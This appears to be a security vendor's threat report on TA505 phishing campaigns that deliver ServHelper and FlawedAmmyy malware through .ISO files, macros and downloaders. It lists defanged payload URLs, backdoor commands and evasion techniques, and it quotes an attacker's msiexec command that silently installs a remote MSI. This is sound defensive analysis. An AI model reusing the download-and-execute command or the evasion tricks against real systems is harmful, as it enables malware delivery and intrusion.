Given the group’s active campaigns since our updates in [June and](https://blog.trendmicro.com/trendlabs-security-intelligence/shifting-tactics-breaking-down-ta505-groups-use-of-html-rats-and-other-techniques-in-latest-campaigns/) [July, we](https://blog.trendmicro.com/trendlabs-security-intelligence/latest-spam-campaigns-from-ta505-now-using-new-malware-tools-gelup-and-flowerpippi/)\ncontinued following their latest campaigns. Just like in previous operations, they continue to make small\nchanges, such as targeting other countries, entities, or the combination of techniques used for deployment, for\neach campaign.\n\nDespite the changes, TA505 continues to use either [FlawedAmmyy RAT (remote access trojan) or](https://blog.trendmicro.com/trendlabs-security-intelligence/spam-campaign-abusing-settingcontent-ms-found-dropping-same-flawedammy-rat-distributed-by-necurs/)\nServHelper as payloads. However, over the last nine campaigns since our June report, they also started using\n.ISO image attachments as the point of entry, as well as a .NET downloader, a new style for macro delivery, a\nnewer version of ServHelper, and a .DLL variant of FlawedAmmyy downloader. The group also started\ntargeting new countries, such as Turkey, Serbia, Romania, Korea, Canada, the Czech Republic, and Hungary.\n\n**.ISO, enabled macros for entry dropping ServHelper or FlawedAmmyy**\n\nWe noticed that the group became active again in the middle of July, targeting Turkish and Serbian banks\nwith emails that had .ISO file attachments as a means of entry. While the method is [not new, the change in](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/malicious-spam-campaign-uses-iso-image-files-to-deliver-lokibot-and-nanocore)\nfile type may yield successful infections given the unusual malware delivery technique.\n\nEmails with an attached .ISO image is an .LNK file that uses command line msiexec to execute an MSI file\nfrom a URL such as hxxp://139[.]180[.]195[.]36/pm2.\n\n\n-----\n\nFigure 1. Infection chains for ServHelper installation\n\nFigure 2. A sample of an .ISO file with an embedded .LNK file\n\nThe pm2 file contains and runs another executable, which is an installer file created using Nullsoft Scriptable\nInstall System (NSIS), a free script-driven installer authoring tool for Windows. This NSIS-encapsulated file\nthen installs ServHelper.\n\n\n-----\n\nIn another sample we obtained, we found an Excel attachment with malicious macros embedded in the file.\nThe macros directly download the file created using NSIS installer from hxxp://45[.]67[.]229[.]36/p2, which\nis the same binary we found in the .ISO and .LNK files that install ServHelper.\n\nFigure 4. Email sample with an attached Excel file.\n\nIn another sample, the group made several updates with the versions of ServHelper, one of which included\nthe strings’ binary encrypted in Vigenère cipher.\n\nFigure 5. Encrypted string\n\nWe observed that some of the samples still had errors in the cipher routine. In another routine that was\nsupposed to result in a stack overflow, it also displayed an error message. We suspect the developer of this\nparticular sample copied and pasted a stack overflow code.\n\n\n-----\n\nFigure 6. Vigenère cipher in ServHelper and the Delphi code in stack overflow\n\nAnother updated version included encrypted contents of the C&C communication via HTTP (previous\nversions had C&C request and response information in plain text). The encrypted sample — via XOR\nencoding/URL encoding — also received a response from the C&C encrypted with XOR. The XOR key is\nembedded in the binary; in this case, the key was “lol”.\n\n\n-----\n\nFigure 7. XOR Encrypted C&C communication\n\nWe also found two new backdoor commands, runmem and runmemxor, that can run additional .DLL\ncommands in memory.\n\n**_shell: Execute command_**\n**_runmem: Download .DLL in memory and run_**\n**_runmemxor: Download XOR encrypted .DLL and decrypt and run_**\n**_zakr: Register autorun_**\n**_slp: Set sleep time_**\n**_load: Download executable file and run_**\n**_loaddll: Download .DLL and run_**\n**_selfkill: Uninstall itself_**\n\nThe newer version shows that the developers behind ServHelper continued to upgrade it to evade detection\nand add more functions, possibly for even more iterations in the future.\n\nIn a campaign targeting thousands of Korean businesses, we found an .ISO attachment — used as the\nmalicious downloader — disguised as a confirmed flight ticket from a popular airline.\n\nFigure 8. TA505 spoofing an airline company as a malicious file attachment.\n\n\n-----\n\nsuch as the previous iteration, or a .NET compiled downloader.\n\nFigure 9. Infection chains for FlawedAmmyy installation\n\nFigure 10. Screenshot of decompiled script from the .ISO file with a .NET downloader embedded in the e\nticket.\n\nOther samples also included an Excel file attachment with malicious macros that install FlawedAmmyy, or a\nURL included in the email that supposedly downloads the file needed to download the malware.\n\nFigure 11. .LNK embedded in the .ISO file\n\nBoth versions tried to download and execute files km1 or km2, an .MSI installer that executes the\nFlawedAmmyy downloader. This, in turn, downloads an RC4-encrypted FlawedAmmyy RAT payload from\nhxxp://92[.]38[.]135[.]67/2.dat or hxxp://27[.]102[.]70[.]196/1.dat that automatically decrypts and executes\nthe malware. This was also previously [documented by an ESET security researcher.](https://blog.alyac.co.kr/2437)\n\n\n-----\n\ndownloaded depended on the URL that the user opened. Opening the documents will enable the macros and\ndownload the same FlawedAmmyy downloader as the .ISO file iteration from\nhxxp://92[.]38[.]135[.]67 or hxxp://27[.]102[.]70[.]196, with filenames k1 or k2.\n\nIn a campaign that targeted Romanian banks, emails used the subject “Fw: copie COC L5H3” and came with\nan .ISO image attachment.\n\nFigure 12. Infection chains for ServHelper installation with .NET downloader\n\nFurther analysis revealed a .NET downloader embedded in the image, along with routines that were almost\nsimilar to those used in the campaign observed targeting Turkish banks. The .NET downloads jm1 — an .MSI\ninstaller — that installs another NSIS installer, leading to a ServHelper infection in the system.\n\nFigure 13. The decompiled .NET downloader\n\nIn another routine, an Excel file attachment downloads the NSIS installer once the user enables the malicious\nmacros from hxxp://109[.]234[.]37[.]15:80/j1 or hxxp://169[.]239[.]128[.]170/j1. Both URLs contain the\nsame binaries as the ones that the jm1 file installs.\n\n**More typical TA505 campaigns, with old and new targets**\n\nThe group’s more typical payload and routine involves the use of ServHelper and FlawedAmmy RAT and\nattaching a document embedded with malicious commands and strings. One variant targets Serbian banks\nwith subjects pertaining to “payments” or “invoices” applicable in several European languages. Enabling the\nmacros of the Excel file downloads a file created using NSIS installer with ServHelper from\n79[.]141[.]168[.]105 or 195[.]123[.]213[.]126.\n\nWe found another routine from a campaign targeting government agencies in Saudi Arabia, Oman, and Qatar\nwith another type of .XLS or .DOC attachment. The emails used in these campaigns used subjects pertaining\nto finance or urgent concerns on insurance policies.\n\nA similar campaign targeting Turkish educational and government institutions used email subjects pertaining\nto invoice information or personnel payroll, and Visual Basic for Applications (VBA) .XLS or VBA .DOC\n\nSi il t th ti i t i Fi 6 th E l VBA t i th Fl dA\n\n\n-----\n\nMeanwhile, the .DOC VBA macros retrieves the MSI files from hxxp://195.123.245.185/km or\nhxxp://185.225.17.5/km, which executes the NSIS installer for ServHelper installation.\n\nSimilar to one of the routines depicted in Figure 9, the group also reused one of the email samples but\nchanged the targets to India and the United States, and added content referring to invoices. The email may\ncontain different documents, but the URLs for downloading ServHelper as the payload remain the same.\n\nFigure 14. One of the more typical techniques employed by TA505.\n\n**.DLL downloaders that deliver FlawedAmmyy and newly styled macros**\n\nIn the first week of August, we noticed the group using a different approach and style to fetch the\ndownloaders via macros. While FlawedAmmyy RAT was still the final payload, the downloader was different\n— this operation used a .DLL variant. This particular campaign targeted Canada with subjects asking for\nconfirmation of numbers from the marketing department.\n\nFigure 15. Infection chain with .DLL FlawedAmmyy downloader\n\nThe attached document asks the user to enable the macros, which creates an Internet Explorer object instance.\nThis loads a text file from a hardcoded website, wherein the content of the document file is parsed through\nand the inner text of the document is loaded. Our analysis showed that this is likely done so the malicious file\ncan bypass some firewall rules, since the communication uses Internet Explorer.\n\n\n-----\n\nFigure 16. Sample document with malicious macros.\n\nFigure 17. Text file using Internet Explorer for communication to bypass firewall rules.\n\nThe downloaded file is a text file with a single number on each line. The macros process the downloaded\npayload with each number encrypted in XOR with a constant hardcoded value of 106. The result is an\nexecutable file written to the disc and executed.\n\nFigure 18. Executable file written to disk and executed\n\nThe executed .DLL is packed using two layers: a custom packer for the first stage and UPX (Ultimate Packer\nfor Executables) for the second stage. The unpacked payload in memory is also a .DLL — it’s the first time\nwe’ve seen a FlawedAmmyy downloader as a .DLL. As we further analyzed the main behavior by\ndownloading the encrypted FlawedAmmyy RAT and decrypted it with RC4, we found that it was similar to\nthe previous campaigns, but with a few updates.\n\nThe first update is the use of the socket API to send an HTTP request instead of wininet or winhttp API to\ndownload an encrypted FlawedAmmyy, building an HTTP header by itself. This could likely be an effort to\nbypass API hooking for HTTP.\n\n\n-----\n\nFigure 19. Send HTTP request using socket API\n\nThe second change: The decrypted FlawedAmmyy RAT is now saved as dllhots.exe in C:\\temp\\ (it used to be\nsaved as wsus.exe). Lastly, this new FlawedAmmyy downloader overwrites some PE header members with\nrandom values. Specifically, it overwrites the checksum, the address of relocation table in DOS header, and\nthe checksum in optional headers.\n\nFigure 20. Original PE header members (left) vs. overwritten header members (right)\n\nThe decrypted FlawedAmmyy RAT slightly different from the one that TA505 reused over its past\ncampaigns. While the previous strings had the modified AmmyyAdmin binary since the source code was\nleaked, TA505 changed the strings in this sample to PopssAdmin. This may bypass detection rules if the\nsystems’ lists were not updated.\n\nFigure 21. Significant changes in the binary\n\nIn another sample targeting South Korea, the difference with the previous case is the XOR encryption\n\n\n-----\n\nFrom the document embedded with the malicious macros, the macro code calls “Run” on the WScript.Shell\nobject. Most of the strings forming the final command are stored in the “Tag” properties of a form embedded\nin the document.\n\nFigure 22. Sample document in Korean asking the user to enable the macros.\n\nFigure 23. Final command strings in document’s “tag” properties.\n\nThe final command executes the download and installation of the .MSI file into\n_C:\\Windows\\System32\\msiexec.exe” back=13 error=continue /i http://92[.]38[.]135[.]99/99.msi /q_\n_OnLoad=”c:\\windows\\notepad.exe_\n\nFigure 24. .MSI file installed in the system\n\nFrom the parameters above, “/i” means install, “/q” means quiet. The other three parameters do not appear to\n\n\n-----\n\nexecutes FlawedAmmyy RAT.\n\nFigure 25. Unused parameters from log\n\nAround the second week of August, we found a campaign targeting banks in the Czech Republic with\nsubjects pertaining to credit and NAV transfer. Analysis of the samples revealed that the document and macro\nstyle was similar to the Korean campaign that used.MSI files, but this campaign downloads from\nhxxp://185[.]17[.]122[.]220/555.msi or hxxp://159[.]69[.]54[.]146/555.msi. This .MSI file delivers the NSISpacked ServHelper, and the binary shares the same C&C server as the campaign targeting Saudi Arabia,\nOman, Qatar, and Turkey.\n\n**Suspicious activity using ServHelper**\n\nA campaign targeting China spoofed FedEx-themed emails with subjects pertaining to delivery problems,\nfailures, or notifications. Instead of attachments, it had malicious URLs in the message content that lead to\nthe download of a malicious document named fedex.doc from hxxp://www.fedexdocs[.]top/fedex.doc or\nhxxp://www.fedexdocs[.]icu/fedex.doc. The VBA macro in the document downloads an NSIS-packed\nexecutable from hxxps://senddocs[.]icu/stelar.exe, which installs ServHelper.\n\nHowever, while initial analysis of the macro it used made us believe that this was from TA505, the macros’\nobfuscation and style turned out to be more similar to the ones described in [this post, based on the code page,](https://blog.trendmicro.com/trendlabs-security-intelligence/shifting-tactics-breaking-down-ta505-groups-use-of-html-rats-and-other-techniques-in-latest-campaigns/)\nsenders, and fast flux. This particular campaign did not match TA505’s technique. Thus we suspect that other\ncybercriminals purchased or borrowed ServHelper from the underground market for this campaign.\n\n**Conclusion**\n\nA number of ServHelper samples can be found in the wild, but some do not appear to be attributed to TA505.\n[One such sample (reported by a researcher that used the Twitter handle James_inthe_box), delivered Remcos,](https://twitter.com/James_inthe_box/status/1158484189685010432)\nseemingly with a TA505 pattern. However, we think it may be more likely that ServHelper is sold to other\nmalicious actors and tested on possible targets. In the long run, as more changes are added to the malware,\nthis can make attribution to specific groups more difficult.\n\nThe changes and adjustments that TA505 made from the original ServHelper and FlawedAmmyy routines\nmay indicate that the group is experimenting and testing to determine which forms of obfuscation can bypass\ndetections, resulting in more financial returns. It’s also possible that the changes in target countries and\nindustries are driven by the group’s customers; targeting new victims and even returning to previously\ntargeted countries and organizations with new techniques. This also gives TA505 more data on which types\nof files can be further used for detection evasion, or even to deter attribution.\n\nGiven the frequency of changes in routines and deployment from our previous articles, we can expect TA505\nto come up with more methods for payload delivery, malware types, and combinations of previously used and\nnew routines. Further, as the malware is still being upgraded, more iterations can be expected in the future. If\nnot removed completely, malicious actors can still take control of computers, peripherals, sensitive\ninformation, and proprietary data.\n\nAs they continue to target businesses in different sectors, we can expect TA505 to keep using phishing and\nsocial engineering techniques to compromise systems. Enterprises are advised to strengthen their online\nsystems, especially [email gateways.
